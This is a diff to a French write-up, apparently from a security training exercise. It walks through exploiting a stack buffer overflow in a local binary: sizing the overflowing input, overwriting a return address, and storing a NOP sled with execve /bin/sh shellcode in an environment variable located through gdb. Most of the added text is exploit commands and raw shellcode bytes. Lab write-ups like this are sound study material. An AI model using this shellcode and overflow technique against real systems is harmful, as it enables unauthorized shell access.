@@ -41,14 +41,54 @@ le `SIGSEGV` a l'instruction d'apres:
 
 Cela est du au fonctionnement de `read()` (On se souvient du GetNextLine), tout
 le fichier est lu jusqu'au `\0` ou `4096` bytes. Notre ligne avec notre adresse
-a executer se retrouve au mauvais endroit dans la stack! Il fau donc remplacer
-`print 'i'*64 + \x0a` dans notre commande par `print 'i'*4095 + '\x0a'`.
+a executer se retrouve au mauvais endroit dans la stack! Il faut donc remplacer
+`print 'i'*64 + '\x0a'` dans notre commande par `print 'i'*4095 + '\x0a'`.
 
 On réesaye avec la commande corrigé:
 
 `$ python -c 'print "i"*4095 + "\x0a" + "ABCDEFGHI" + "\xef\xbe\xad\xde" + "\x0a"' > /tmp/xploit`
 
+![image](https://user-images.githubusercontent.com/29956389/90004167-7fc3d600-dc95-11ea-8834-ed5521ee6067.png)
 
+Toujours pas! On regarde donc a nouveau l'entrée qu'on avait mit en premier pour faire segfault notre binaire au début. La seule différence est la longueur de notre deuxieme chaine de caractères. Essayons alors de rajouter quelques bytes a la fin, et prennons `20 bytes` comme référence (`strncpy(dest, &buffer, 20)`):
 
-python -c "print 'A' * 4095 + '\n' + 'i' + '\xf0\xf7\xff\xbf'*3 + 'B'*30" >
-/tmp/file2
+Soit:
+
+`$ python -c 'print [4095 bytes] + "\n" + [9 bytes] + [4 bytes de notre adresse] + [20 - (9 + 4) = 7 bytes] + "\x0a"' > /tmp/xploit`
+
+Ce qui donne:
+
+`python -c 'print "i"*4095 + "\x0a" + "ABCDEFGHI" + "\xef\xbe\xad\xde" + "1234567" + "\x0a"' > /tmp/xploit`
+
+![image](https://user-images.githubusercontent.com/29956389/90004691-5eafb500-dc96-11ea-8e7d-504a6c3fa35b.png)
+
+Cela marche enfin !
+
+On a maintenant le choix d'inserer notre nopsled + shellcode soit dans le
+buffer, soit dans l'environement, nous choissisons la deuxieme, pour aucune
+raison particulière.
+
+`$ echo -ne
+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' > /tmp/shellcode.bin`
+
+`$ export SLEDCODE=$(python -c 'print "\x90"*512')$(cat /tmp/shellcode.bin)`
+
+On localise l'adresse du sled:
+
+`(gdb)> x/4s *((char**)environ + 8)`
+
+`> de 0xbffff6c2 a 0xbffff8f4`
+
+`0xbffff6c2 + 256 (Taille sled / 2) = 0xbffff7c2`
+
+Et on lance:
+
+`python -c 'print "i"*4095 + "\x0a" + "ABCDEFGHI" + "\xc2\xf7\xff\xbf" +
+"1234567" + "\x0a"' > /tmp/xploit`
+
+![image](https://user-images.githubusercontent.com/29956389/90006073-830c9100-dc98-11ea-923a-b5efe5915dc7.png)
+
+On essaye donc en dehors de GDB:
+
+![image](https://user-images.githubusercontent.com/29956389/90006208-bea75b00-dc98-11ea-9826-ed0bcc70237b.png)
+
